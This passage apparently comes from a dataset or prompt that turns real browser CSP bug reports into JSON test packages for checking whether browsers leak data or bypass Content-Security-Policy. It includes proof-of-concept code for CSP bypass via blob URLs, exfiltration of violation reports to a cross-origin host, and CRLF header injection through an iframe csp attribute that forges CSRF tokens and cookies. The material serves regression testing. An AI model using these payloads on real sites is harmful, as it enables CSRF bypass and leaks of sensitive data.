\\\"data:text/html;base64,PGlmcmFtZSBpZD0nMTIzJz48L2lmcmFtZT48aW1nIHNyYz0naHR0cHM6Ly9hLnRlc3QvcmVzb3VyY2VzL2N1c3RvbS82MDB4NDAwLnBuZycgb25sb2FkPSdkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiMTIzIikuc3JjPSJodHRwczovL2EudGVzdC9yZXBvcnQvP2xlYWs9bm90LWM3Njc2MzUiJz4=\\\"\\n  );\\n  /* Original base64 string:\\n    <iframe id='123'></iframe><img src='https://a.test/resources/CSP/600x400.png' onload='document.getElementById(\\\"123\\\").src=\\\"https://a.test/report/?leak=not-c767635\\\"'>\\n    */\\n</script>\\n\"}}, \"leak.test\": {\"main\": {\"index.html\": \"<html>\\n  <head>\\n    <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"img-src 'self';\\\" />\\n  </head>\\n  <body>\\n    <iframe\\n      src=\\\"https://a.test/CSP/c767635/helper\\\"\\n      width=\\\"500px\\\"\\n      height=\\\"500px\\\"\\n    ></iframe>\\n  </body>\\n</html>\\n\"}}}}}, {\"BugReport\": \"Firefox's CSP implementation blocks dynamically created script tags (scripts created via document.createElement) with a valid nonce if the URL redirects.\\nSince the created script has a valid nonce it should execute (script gets executed in Chrome).\\nBecause of this bug, sites setting a nonce-based CSP (without strict-dynamic) randomly break in Firefox if some of their scripts are behind redirects.\\n\\nCode to reproduce in Firefox:\\n<!DOCTYPE html>\\n<html>\\n<head>\\n  <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"script-src 'nonce-abcd1234'\\\">\\n</head>\\n<body>\\n  <script nonce='abcd1234'>\\n    var s = document.createElement('script');\\n    s.setAttribute('nonce', 'abcd1234');\\n    s.src = 'https://goo.gl/jEH8zk';  // 301 redirect.\\n    document.head.appendChild(s);     // Blocked by CSP in FF because of redirect.\\n  </script>\\n</body>\\n</html>\\n\\n\\nPreview\\nhttps://gist.github.com/lweichselbaum/9c8e32c592889ffc2f103fce9d45eaea\\n\\nhttp://gist-preview.herokuapp.com/preview?gist_url=https%3A%2F%2Fgist.githubusercontent.com%2Flweichselbaum%2F9c8e32c592889ffc2f103fce9d45eaea%2Fraw%2F505ed8c472a805c70cd05059206dd5f91c9a06ce%2FFF_CSP_BUG.html\", \"TestSolution\": {\"f1469150\": {\"url_queue.txt\": \"https://a.test/CSP/f1469150/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<script nonce=\\\"foobar\\\" src=\\\"https://a.test/CSP/f1469150/helper\\\"></script>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"script-src 'nonce-foobar' 'unsafe-inline' 'unsafe-eval'; report-uri /report/?leak=f1469150\\\"\\n  }\\n]\"}, \"helper\": {\"index.html\": \"\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"status\\\",\\n    \\\"value\\\": \\\"302\\\"\\n  },\\n  {\\n    \\\"key\\\": \\\"Location\\\",\\n    \\\"value\\\": \\\"https://leak.test/dummy\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1. Go to https://test.shhnjk.com/csp_open.php\\n2. Click go\\n\\nWhat is the expected behavior?\\nCSP violation report sent to test.shhnjk.com (CSP implementor)\\n\\nWhat went wrong?\\nIf <base> tag is specified to cross-origin (via local-scheme docuemnt or HTML injection) and CSP report-uri is relative URL, CSP violation report can be sent to cross-origin.\\n\\nThis could be used to steal cross-origin information in violation report since report might contain secret information like nonce, referrer, page URL, and so on.\\n\\nDid this work before? N/A\\n\\nChrome version: 62.0.3202.62  Channel: stable\\nOS Version: 10.0\\nFlash Version:\\n\\nI'm wondering this might further affect other report-uri features such as HPKP, XSS auditor, Expect-CT, and so on. Which I will test later today(I hope).\", \"TestSolution\": {\"c777350\": {\"url_queue.txt\": \"https://leak.test/CSP/c777350/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<html>\\n  <head>\\n    <base href=\\\"https://a.test\\\" />\\n  </head>\\n  <body>\\n    <img src=\\\"https://a.test/image\\\" />\\n  </body>\\n</html>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src 'self'; report-uri /report/?leak=c777350\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.30 Safari/537.36\\n\\nSteps to reproduce:\\n\\n* Opened console\\n* Ticked preserve log\\n* Visited https://arturjanc.com/cgi-bin/ff63-nonce-redirect.py\\n\\n\\nActual results:\\n\\nAn exception gets logged and reported:\\nContent Security Policy: The page\\u2019s settings blocked the loading of a resource at https://payments.google.com/payments/v4/js/integrator.js (\\u201cscript-src\\u201d).\\n\\nThis is due to the fact that the script is dynamically loaded and redirects to \\\"https://www.gstatic.com/...\\\"\\n\\nThis looks like a special case of bug 1469150 which was marked as fixed. Apparently it is still there for dynamically loaded scripts.\\n\\nThis is not just a security issue for fingerprinting, but also a functional bug as it would break applications that use nonces correctly.\\n\\n\\nExpected results:\\n\\nNo violation reported.\", \"TestSolution\": {\"f1505412\": {\"url_queue.txt\": \"https://a.test/CSP/f1505412/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<script src=\\\"helper\\\" nonce=\\\"foobar\\\"></script>\", \"headers.json\": \"[{\\n    \\\"key\\\": \\\"Content-Security-Policy-Report-Only\\\",\\n    \\\"value\\\": \\\"script-src 'nonce-foobar'; report-uri /report/?leak=f1505412\\\"\\n}]\"}, \"helper\": {\"index.html\": \"\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"status\\\",\\n        \\\"value\\\": \\\"302\\\"\\n    },\\n    {\\n        \\\"key\\\": \\\"Location\\\",\\n        \\\"value\\\": \\\"https://leak.test/dummy\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1. Go to https://test.shhnjk.com/blobCSP.html\\n\\nWhat is the expected behavior?\\nScript is blocked by CSP \\\"script-src 'nonce-test'\\\" (Firefox does).\\n\\nWhat went wrong?\\nCSP is bypassed. Note that if the same blob URL is set to iframe or opened to new window, that's blocked correctly.\\n\\nSource:\\n<meta http-equiv=\\\"content-security-policy\\\" content=\\\"script-src 'nonce-test'\\\">\\n<script nonce=\\\"test\\\">\\nvar attackerControlledString = \\\"<script>alert(document.domain)<\\\\/script>\\\";\\nvar blob = new Blob([attackerControlledString], {type : 'text/html'});\\nvar url = URL.createObjectURL(blob);\\nlocation.href=url;\\n</script>\\n\\nDid this work before? N/A\\n\\nChrome version: 63.0.3239.132  Channel: stable\\nOS Version: OS X 10.13.2\\nFlash Version:\", \"TestSolution\": {\"c799747\": {\"url_queue.txt\": \"https://leak.test/CSP/c799747/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<script nonce=\\\"test\\\">\\n  var attackerControlledString =\\n    \\\"<script src=https://a.test/report/?leak=c799747><\\\\/script>\\\";\\n  var blob = new Blob([attackerControlledString], { type: \\\"text/html\\\" });\\n  var url = URL.createObjectURL(blob);\\n  location.href = url;\\n</script>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'none'; script-src 'unsafe-inline'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0\\nSteps to reproduce:\\nNavigate to https://l0.cm/fx_csp_violation_leak.html . This page has the following CSP and CSP violation event listener:\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'self' 'unsafe-inline' vulnerabledoma.in\\\">\\ndocument.addEventListener('securitypolicyviolation', e => {\\n        console.dir(e);\\n        alert(e.blockedURI);\\n    });\\nIn addition, there are three buttons to embed other origin's pages into an iframe. These buttons are for testing the following cases.\\nTEST 1: Navigate to domain not allowed by CSP via 302 redirect\\nTEST 2: Navigate to domain not allowed by CSP via JavaScript\\nTEST 3: Navigate to domain not allowed by CSP via link\\nClick on the \\\"TEST 1\\\" button. \\\"https://vulnerabledoma.in/fx_csp_violation_leak_302.php\\\" is popped up. (= Safe. I think this behavior comes from a fix of bug 1069762 )\\nClick on the \\\"TEST 2\\\" button. \\\"https://www.vulnerabledoma.in/path?query\\\" is popped up. (= leak of redirect URL )\\nClick on the \\\"TEST 3\\\" button and then click on the displayed link. \\\"https://www.vulnerabledoma.in/path?query\\\" is popped up. (= leak of redirect URL )\\nFor your information, also the behavior of \\\"TEST 1\\\" is different from other browsers. Other browsers return \\\"https://www.vulnerabledoma.in\\\".\\nActual results:\\nThe CSP violation event object ( and CSP violation report ) contains the full redirect URL if the violation happens via a client-side navigation.\\nExpected results:\\nThe CSP violation event object ( and CSP violation report ) should not contain the full redirect URL in the case of navigation started from a client-side code also. This is because the redirect URL might have sensitive information.\", \"TestSolution\": {\"f1542194\": {\"a.test\": {\"main\": {\"index.html\": \"<iframe id=\\\"iframe\\\" src=\\\"helper\\\"></iframe>\\n\\n<script>\\n  document.addEventListener(\\\"securitypolicyviolation\\\", function (e) {\\n    console.dir(e);\\n    alert(e.blockedURI);\\n    if (e.blockedURI.indexOf(\\\"f1542194\\\") > -1) {\\n      document.getElementById(\\\"iframe\\\").src =\\n        \\\"https://a.test/report/?leak=f1542194\\\";\\n    }\\n  });\\n</script>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'self' 'unsafe-inline'\\\"\\n    }\\n]\"}, \"helper\": {\"index.html\": \"<script>\\n  document.location.href = \\\"https://leak.test/CSP/f1542194/helper2\\\";\\n</script>\\n\"}}, \"leak.test\": {\"helper2\": {\"index.html\": \"Nothing to see here\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36\\n\\nSteps to reproduce the problem:\\n<?php\\nheader(\\\"Content-Security-Policy: object-src 'none'\\\");\\n?>\\n<object data=\\\"http://www.w3school.com.cn/i/eg_tulip.jpg\\\"></object>\\n\\nWhat is the expected behavior?\\n\\nWhat went wrong?\\nWhen CSP set `object-src 'none'`, Chrome let the image in object tag show while Firefox block it\\n\\nDid this work before? N/A\\n\\nChrome version: 64.0.3282.140  Channel: stable\\nOS Version: OS X 10.13.3\\nFlash Version: Shockwave Flash 28.0 r0\", \"TestSolution\": {\"c811691\": {\"url_queue.txt\": \"https://leak.test/CSP/c811691/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<object data=\\\"https://a.test/report/?leak=c811691\\\" type=\\\"image/jpeg\\\"></object>\\n\", \"headers.json\": \"[{\\n\\\"key\\\": \\\"Content-Security-Policy\\\",\\n\\\"value\\\": \\\"default-src 'none'; object-src 'none'\\\"\\n}]\"}}}}}]}"
            }
        ]
    },
    {
        "role": "user",
        "content": "Generate a test in the same JSON format as provided and NO additional information for:BugID=c845961: VULNERABILITY DETAILS\nUsing csp attribute in <iframe> element, an attacker might set arbitrary http headers, using \"\\r\\n\" characters. The most obvious scenario of attack is to add a \"x-csrf-token\" header to bypass header-based CSRF protection.\nInterestingly, though, it seems that arbitrary headers might be set, including Host, Content-type or User-Agent.\nVERSION\nChrome Version: 66.0.3359.181 stable\nOperating System: macOS Sierra 10.12.6 (16G1314)\nREPRODUCTION CASE\nOn http://bntk.pl/headers.php there is a simple page that just returns all http request headers that the server saw. Please note that the page responds with Allow-CSP-From: \\* header, so that it can be easily seen what headers were sent.\nBelow is a code that sets five headers: Host, X-Csrf-Token, Cookie, User-Agent and Content-Type.\n<!doctype html><meta charset=utf-8>.\n<script> const ifr = document.createElement('iframe'); ifr.src = 'http://bntk.pl/headers.php?'+Math.random(); ifr.height = '600px'; const headers = [ 'X-CSRF-TOKEN: 0123456789abcdef', 'Host: changed-host.bntk.pl', 'Cookie: aaaaa', 'User-Agent: Whatever', 'Content-type: application/json', ] ifr.csp = 'script-src\\r\\n' + headers.join('\\r\\n'); document.body.appendChild(ifr); </script>\nThe output should be similar to:\narray(11) {\n[\"Host\"]=>\nstring(20) \"changed-host.bntk.pl\"\n[\"Connection\"]=>\nstring(10) \"keep-alive\"\n[\"Upgrade-Insecure-Requests\"]=>\nstring(1) \"1\"\n[\"Sec-Required-CSP\"]=>\nstring(10) \"script-src\"\n[\"X-CSRF-TOKEN\"]=>\nstring(16) \"0123456789abcdef\"\n[\"Cookie\"]=>\nstring(5) \"aaaaa\"\n[\"User-Agent\"]=>\nstring(8) \"Whatever\"\n[\"Content-type\"]=>\nstring(16) \"application/json\"\n[\"Accept\"]=>\nstring(85) \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\"\n[\"Accept-Encoding\"]=>\nstring(13) \"gzip, deflate\"\n[\"Accept-Language\"]=>\nstring(35) \"pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\"\n}\nwhich proves that additional headers were set."
    }
]